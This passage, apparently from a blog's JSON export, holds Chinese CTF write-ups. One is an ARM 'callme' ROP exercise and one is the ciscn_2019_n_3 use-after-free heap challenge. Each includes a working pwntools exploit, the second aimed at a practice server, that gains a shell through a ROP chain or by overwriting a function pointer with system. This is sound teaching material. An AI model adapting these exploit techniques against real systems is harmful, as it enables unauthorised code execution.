callme_xxx`的不能正常跳到`callme_two`。\n\nexp:\n\n```sh\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='callme_armv5'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\np=process([\"qemu-arm\",\"-L\",\"/usr/arm-linux-gnueabi/\", \"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n\ncallme_one=0x00010864\ncallme_two=0x00010854\ncallme_three=0x00010844\n\npop_r0_r1_r2_lr_pc=0x00010870\n\nr()\npayload=b'a'*0x24+p32(pop_r0_r1_r2_lr_pc)\npayload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(pop_r0_r1_r2_lr_pc)+p32(elf.plt['callme_one'])\npayload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(pop_r0_r1_r2_lr_pc)+p32(elf.plt['callme_two'])\npayload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(elf.plt['callme_three'])*2\ns(payload)\n\nitr()\n```\n\n","slug":"callme","published":1,"updated":"2023-03-23T12:12:38.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafs002w5oudadggc82e","content":"<p>arm pwn入门题，arm下的简单ROP。</p>\n<span id=\"more\"></span>\n\n<p>查壳：同32位动态链接，只开了NX</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/callme_armv5/callme_armv5&#x27;</span></span><br><span class=\"line\">    Arch:     arm-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x10000)</span><br><span class=\"line\">    RUNPATH:  b<span class=\"string\">&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>逆向：</p>\n<p>也是``pwnme<code>中有栈溢出，但</code>UsefulFunction<code>和</code>UsefulGadgets`有些意义不明。</p>\n<p><code>pwnme</code>中提示我去看介绍，看了之后才明白</p>\n<blockquote>\n<p>You must call the <code>callme_one()</code>, <code>callme_two()</code> and <code>callme_three()</code> functions in that order, each with the arguments <code>0xdeadbeef</code>, <code>0xcafebabe</code>, <code>0xd00df00d</code> e.g. <code>callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code> to print the flag. </p>\n</blockquote>\n<p>我需要通过ROp走完<code>callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) -&gt; callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d) -&gt; callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code>才能<code>cat flag</code>。</p>\n<p><code>r0、r1、r2</code>分别控制第一、二、三个参数，还有这里要用elf.plt获取callme_xxx的地址，直接获取<code>BL callme_xxx</code>的不能正常跳到<code>callme_two</code>。</p>\n<p>exp:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,<span class=\"built_in\">arch</span>=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;callme_armv5&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=process([<span class=\"string\">&quot;qemu-arm&quot;</span>,<span class=\"string\">&quot;-L&quot;</span>,<span class=\"string\">&quot;/usr/arm-linux-gnueabi/&quot;</span>, <span class=\"string\">&quot;./&quot;</span>+filename])</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = lambda data               :p.send(data)</span><br><span class=\"line\">sl      = lambda data               :p.sendline(data)</span><br><span class=\"line\">r       = lambda num=4096           :p.recv(num)</span><br><span class=\"line\">rl      = lambda num=4096           :p.recvline(num)</span><br><span class=\"line\">ru      = lambda x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = lambda                    :p.interactive()</span><br><span class=\"line\">uu32    = lambda data               :u32(data.ljust(4,b<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = lambda data               :u64(data.ljust(8,b<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = lambda name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">def debug(cmd=<span class=\"string\">&#x27;\\n&#x27;</span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">callme_one=0x00010864</span><br><span class=\"line\">callme_two=0x00010854</span><br><span class=\"line\">callme_three=0x00010844</span><br><span class=\"line\"></span><br><span class=\"line\">pop_r0_r1_r2_lr_pc=0x00010870</span><br><span class=\"line\"></span><br><span class=\"line\">r()</span><br><span class=\"line\">payload=b<span class=\"string\">&#x27;a&#x27;</span>*0x24+p32(pop_r0_r1_r2_lr_pc)</span><br><span class=\"line\">payload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(pop_r0_r1_r2_lr_pc)+p32(elf.plt[<span class=\"string\">&#x27;callme_one&#x27;</span>])</span><br><span class=\"line\">payload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(pop_r0_r1_r2_lr_pc)+p32(elf.plt[<span class=\"string\">&#x27;callme_two&#x27;</span>])</span><br><span class=\"line\">payload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(elf.plt[<span class=\"string\">&#x27;callme_three&#x27;</span>])*2</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>arm pwn入门题，arm下的简单ROP。</p>","more":"<p>查壳：同32位动态链接，只开了NX</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/callme_armv5/callme_armv5&#x27;</span></span><br><span class=\"line\">    Arch:     arm-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x10000)</span><br><span class=\"line\">    RUNPATH:  b<span class=\"string\">&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>逆向：</p>\n<p>也是``pwnme<code>中有栈溢出，但</code>UsefulFunction<code>和</code>UsefulGadgets`有些意义不明。</p>\n<p><code>pwnme</code>中提示我去看介绍，看了之后才明白</p>\n<blockquote>\n<p>You must call the <code>callme_one()</code>, <code>callme_two()</code> and <code>callme_three()</code> functions in that order, each with the arguments <code>0xdeadbeef</code>, <code>0xcafebabe</code>, <code>0xd00df00d</code> e.g. <code>callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code> to print the flag. </p>\n</blockquote>\n<p>我需要通过ROp走完<code>callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) -&gt; callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d) -&gt; callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code>才能<code>cat flag</code>。</p>\n<p><code>r0、r1、r2</code>分别控制第一、二、三个参数，还有这里要用elf.plt获取callme_xxx的地址，直接获取<code>BL callme_xxx</code>的不能正常跳到<code>callme_two</code>。</p>\n<p>exp:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,<span class=\"built_in\">arch</span>=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;callme_armv5&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=process([<span class=\"string\">&quot;qemu-arm&quot;</span>,<span class=\"string\">&quot;-L&quot;</span>,<span class=\"string\">&quot;/usr/arm-linux-gnueabi/&quot;</span>, <span class=\"string\">&quot;./&quot;</span>+filename])</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = lambda data               :p.send(data)</span><br><span class=\"line\">sl      = lambda data               :p.sendline(data)</span><br><span class=\"line\">r       = lambda num=4096           :p.recv(num)</span><br><span class=\"line\">rl      = lambda num=4096           :p.recvline(num)</span><br><span class=\"line\">ru      = lambda x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = lambda                    :p.interactive()</span><br><span class=\"line\">uu32    = lambda data               :u32(data.ljust(4,b<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = lambda data               :u64(data.ljust(8,b<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = lambda name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">def debug(cmd=<span class=\"string\">&#x27;\\n&#x27;</span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">callme_one=0x00010864</span><br><span class=\"line\">callme_two=0x00010854</span><br><span class=\"line\">callme_three=0x00010844</span><br><span class=\"line\"></span><br><span class=\"line\">pop_r0_r1_r2_lr_pc=0x00010870</span><br><span class=\"line\"></span><br><span class=\"line\">r()</span><br><span class=\"line\">payload=b<span class=\"string\">&#x27;a&#x27;</span>*0x24+p32(pop_r0_r1_r2_lr_pc)</span><br><span class=\"line\">payload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(pop_r0_r1_r2_lr_pc)+p32(elf.plt[<span class=\"string\">&#x27;callme_one&#x27;</span>])</span><br><span class=\"line\">payload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(pop_r0_r1_r2_lr_pc)+p32(elf.plt[<span class=\"string\">&#x27;callme_two&#x27;</span>])</span><br><span class=\"line\">payload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(elf.plt[<span class=\"string\">&#x27;callme_three&#x27;</span>])*2</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"ciscn_2019_n_3","date":"2023-01-02T11:54:26.000Z","_content":"\nciscn_2019_n_3，对UAF的利用\n<!-- more -->\n\n查壳,32位，除了PIE和RELRO其他都开了\n![check](./ciscn_2019_n_3/check.png)\n\n反汇编之后可以看到是个经典的菜单堆题。有四个功能，new note、del note、show note和purchase，购买的功能可以忽略。\n\nnote分为两种，一种是记录数字的，一种是记录字符串的，但结构是类似的，每个note的user data都是0xc大小。\n\n```c\nstruct note\n{\n    int (*rec_print)(int);  //存放自定义print函数的函数指针，记录数字和记录字符串的print函数不一样\n    int (*rec_free)(void*); //存放自定义free函数的函数指针，记录数字和记录字符串的free函数不一样\n    int Integer;    //存放数字时是这样\n    char* Text;     //存放字符串时是这样，会通过malloc(length)分配内存\n}\n```\n\nmain函数中存在system()函数，因此这次不用泄露libc得到system地址了。\n\n这题主要的漏洞点在note的free函数中，在free后没有对指针赋NULL，存在UAF。\n\n```c\nint __cdecl rec_str_free(void *ptr)\n{\n  free(*((void **)ptr + 2));\n  free(ptr);\n  return puts(\"Note freed!\");\n}\n```\n\n可以看到并没有对record[index]赋NULL，因此即使del了一个note，该note仍然能被利用执行他的功能，如show note和del note。\n\n```c\nint do_del()\n{\n  int v0; // eax\n\n  v0 = ask(\"Index\");\n  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);\n}\n```\n\n这题中show和del都是依靠存放在note中的函数指针去实现的，我们可以尝试改写函数指针位置的内容为system，再调用对应的功能，就可以执行system函数。show note因为执行的是(*(int (__cdecl **)(int))(records[v0]))(records[v0])，不能执行system(\"/bin/sh\")，因此考虑修改自定义的free函数指针。\n\n修改函数指针则利用了fast bin的机制，执行free时，如果chunk的大小在fast bin范围内，会先放入fast bin，之后malloc的时候，如果malloc的chunk大小在fast bin的范围内，会优先在fast bin中查找有没有刚好满足大小的chunk，如果有，则直接返回。\n\n而记录字符串的note会根据字符串的长度length申请一个chunk来存放字符串，通过设置length==0xc，可以申请到我们之前free的chunk，那么我们可以利用这个字符串来修改chunk中的数据，修改free函数指针为system，修改第一个4byte为\"sh\\x00\\x00\"，之后利用UAF，执行已经释放的note的del功能，就可以执行system(\"sh\\x00\\x00\")了。\n\n堆布局：\n1.先申请两个integer note，并先后free掉\n2.申请一个text note,并设置length==0xc，写入\"sh\\x00\\x00\"和system@plt\n3.执行对应integer note的del note功能get shell。\n\n```python\nfrom pwn import*\nelf=ELF(\"./ciscn_2019_n_3\")\n#p=process(\"./ciscn_2019_n_3\")\np=remote('node4.buuoj.cn',29707)\ncontext.log_level='debug'\nsys=elf.plt['system']\n\ndef add_note(idx,type,size,value):\n\tp.recvuntil('CNote > ')\n\tp.sendline('1')\n\tp.recvuntil('Index > ')\n\tp.sendline(str(idx))\n\tp.recvuntil('Type > ')\n\tif type == 1:\n\t\tp.sendline('1')\n\t\tp.recvuntil('Value > ')\n\t\tp.sendline(str(value))\n\telse:\n\t\tp.sendline('2')\n\t\tp.recvuntil('Length > ')\n\t\tp.sendline(str(size))\n\t\tp.recvuntil('Value > ')\n\t\tp.sendline(str(value))\n\tp.recvuntil('Here is it:')\n\ndef del_note(idx):\n\tp.recvuntil('CNote > ')\n\tp.sendline('2')\n\tp.recvuntil('Index > ')\n\tp.sendline(str(idx))\n\ndef dump_note(idx):\n\tp.recvuntil('CNote > ')\n\tp.sendline('3')\n\tp.recvuntil('Index > ')\n\tp.sendline(str(idx))\n\n\nadd_note(0,1,0,1234)\nadd_note(1,1,0,5678)\ndel_note(1)\ndel_note(0)\npayload=\"sh\\x00\\x00\"+p32(sys)\nadd_note(2,2,12,payload)\ndel_note(1)\np.interactive()\n```\n\n\n\n\n\n","source":"_posts/ciscn_2019_n_3.md","raw":"---\ntitle: ciscn_2019_n_3\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n---\n\nciscn_2019_n_3，对UAF的利用\n<!-- more -->\n\n查壳,32位，除了PIE和RELRO其他都开了\n![check](./ciscn_2019_n_3/check.png)\n\n反汇编之后可以看到是个经典的菜单堆题。有四个功能，new note、del note、show note和purchase，购买的功能可以忽略。\n\nnote分为两种，一种是记录数字的，一种是记录字符串的，但结构是类似的，每个note的user data都是0xc大小。\n\n```c\nstruct note\n{\n    int (*rec_print)(int);  //存放自定义print函数的函数指针，记录数字和记录字符串的print函数不一样\n    int (*rec_free)(void*); //存放自定义free函数的函数指针，记录数字和记录字符串的free函数不一样\n    int Integer;    //存放数字时是这样\n    char* Text;     //存放字符串时是这样，会通过malloc(length)分配内存\n}\n```\n\nmain函数中存在system()函数，因此这次不用泄露libc得到system地址了。\n\n这题主要的漏洞点在note的free函数中，在free后没有对指针赋NULL，存在UAF。\n\n```c\nint __cdecl rec_str_free(void *ptr)\n{\n  free(*((void **)ptr + 2));\n  free(ptr);\n  return puts(\"Note freed!\");\n}\n```\n\n可以看到并没有对record[index]赋NULL，因此即使del了一个note，该note仍然能被利用执行他的功能，如show note和del note。\n\n```c\nint do_del()\n{\n  int v0; // eax\n\n  v0 = ask(\"Index\");\n  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);\n}\n```\n\n这题中show和del都是依靠存放在note中的函数指针去实现的，我们可以尝试改写函数指针位置的内容为system，再调用对应的功能，就可以执行system函数。show note因为执行的是(*(int (__cdecl **)(int))(records[v0]))(records[v0])，不能执行system(\"/bin/sh\")，因此考虑修改自定义的free函数指针。\n\n修改函数指针则利用了fast bin的机制，执行free时，如果chunk的大小在fast bin范围内，会先放入fast bin，之后malloc的时候，如果malloc的chunk大小在fast bin的范围内，会优先在fast bin中查找有没有刚好满足大小的chunk，如果有，则直接返回。\n\n而记录字符串的note会根据字符串的长度length申请一个chunk来存放字符串，通过设置length==0xc，可以申请到我们之前free的chunk，那么我们可以利用这个字符串来修改chunk中的数据，修改free函数指针为system，修改第一个4byte为\"sh\\x00\\x00\"，之后利用UAF，执行已经释放的note的del功能，就可以执行system(\"sh\\x00\\x00\")了。\n\n堆布局：\n1.先申请两个integer note，并先后free掉\n2.申请一个text note,并设置length==0xc，写入\"sh\\x00\\x00\"和system@plt\n3.执行对应integer note的del note功能get shell。\n\n```python\nfrom pwn import*\nelf=ELF(\"./ciscn_2019_n_3\")\n#p=process(\"./ciscn_2019_n_3\")\np=remote('node4.buuoj.cn',29707)\ncontext.log_level='debug'\nsys=elf.plt['system']\n\ndef add_note(idx,type,size,value):\n\tp.recvuntil('CNote > ')\n\tp.sendline('1')\n\tp.recvuntil('Index > ')\n\tp.sendline(str(idx))\n\tp.recvuntil('Type > ')\n\tif type == 1:\n\t\tp.sendline('1')\n\t\tp.recvuntil('Value > ')\n\t\tp.sendline(str(value))\n\telse:\n\t\tp.sendline('2')\n\t\tp.recvuntil('Length > ')\n\t\tp.sendline(str(size))\n\t\tp.recvuntil('Value > ')\n\t\tp.sendline(str(value))\n\tp.recvuntil('Here is it:')\n\ndef del_note(idx):\n\tp.recvuntil('CNote > ')\n\tp.sendline('2')\n\tp.recvuntil('Index > ')\n\tp.sendline(str(idx))\n\ndef dump_note(idx):\n\tp.recvuntil('CNote > ')\n\tp.sendline('3')\n\tp.recvuntil('Index > ')\n\tp.sendline(str(idx))\n\n\nadd_note(0,1,0,1234)\nadd_note(1,1,0,5678)\ndel_note(1)\ndel_note(0)\npayload=\"sh\\x00\\x00\"+p32(sys)\nadd_note(2,2,12,payload)\ndel_note(1)\np.interactive()\n```\n\n\n\n\n\n","slug":"ciscn_2019_n_3","published":1,"updated":"2023-01-02T15:38:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafs002z5oudgcmvh3jw","content":"<p>ciscn_2019_n_3，对UAF的利用</p>\n<span id=\"more\"></span>\n\n<p>查壳,32位，除了PIE和RELRO其他都开了<br><img src=\"./ciscn_2019_n_3/check.png\" alt=\"check\"></p>\n<p>反汇编之后可以看到是个经典的菜单堆题。有四个功能，new note、del note、show note和purchase，购买的功能可以忽略。</p>\n<p>note分为两种，一种是记录数字的，一种是记录字符串的，但结构是类似的，每个note的user data都是0xc大小。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">note</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> (*rec_print)(<span class=\"type\">int</span>);  <span class=\"comment\">//存放自定义print函数的函数指针，记录数字和记录字符串的print函数不一样</span></span><br><span class=\"line\">    <span class=\"type\">int</span> (*rec_free)(<span class=\"type\">void</span>*); <span class=\"comment\">//存放自定义free函数的函数指针，记录数字和记录字符串的free函数不一样</span></span><br><span class=\"line\">    <span class=\"type\">int</span> Integer;    <span class=\"comment\">//存放数字时是这样</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* Text;     <span class=\"comment\">//存放字符串时是这样，会通过malloc(length)分配内存</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>main函数中存在system()函数，因此这次不用泄露libc得到system地址了。</p>\n<p>这题主要的漏洞点在note的free函数中，在free后没有对指针赋NULL，存在UAF。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">rec_str_free</span><span class=\"params\">(<span class=\"type\">void</span> *ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(*((<span class=\"type\">void</span> **)ptr + <span class=\"number\">2</span>));</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Note freed!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到并没有对record[index]赋NULL，因此即使del了一个note，该note仍然能被利用执行他的功能，如show note和del note。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">do_del</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v0; <span class=\"comment\">// eax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v0 = ask(<span class=\"string\">&quot;Index&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (*(<span class=\"type\">int</span> (__cdecl **)(<span class=\"type\">int</span>))(records[v0] + <span class=\"number\">4</span>))(records[v0]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这题中show和del都是依靠存放在note中的函数指针去实现的，我们可以尝试改写函数指针位置的内容为system，再调用对应的功能，就可以执行system函数。show note因为执行的是(*(int (__cdecl **)(int))(records[v0]))(records[v0])，不能执行system(“/bin/sh”)，因此考虑修改自定义的free函数指针。</p>\n<p>修改函数指针则利用了fast bin的机制，执行free时，如果chunk的大小在fast bin范围内，会先放入fast bin，之后malloc的时候，如果malloc的chunk大小在fast bin的范围内，会优先在fast bin中查找有没有刚好满足大小的chunk，如果有，则直接返回。</p>\n<p>而记录字符串的note会根据字符串的长度length申请一个chunk来存放字符串，通过设置length==0xc，可以申请到我们之前free的chunk，那么我们可以利用这个字符串来修改chunk中的数据，修改free函数指针为system，修改第一个4byte为”sh\\x00\\x00”，之后利用UAF，执行已经释放的note的del功能，就可以执行system(“sh\\x00\\x00”)了。</p>\n<p>堆布局：<br>1.先申请两个integer note，并先后free掉<br>2.申请一个text note,并设置length==0xc，写入”sh\\x00\\x00”和system@plt<br>3.执行对应integer note的del note功能get shell。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./ciscn_2019_n_3&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./ciscn_2019_n_3&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">29707</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">sys=elf.plt[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_note</span>(<span class=\"params\">idx,<span class=\"built_in\">type</span>,size,value</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;CNote &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span 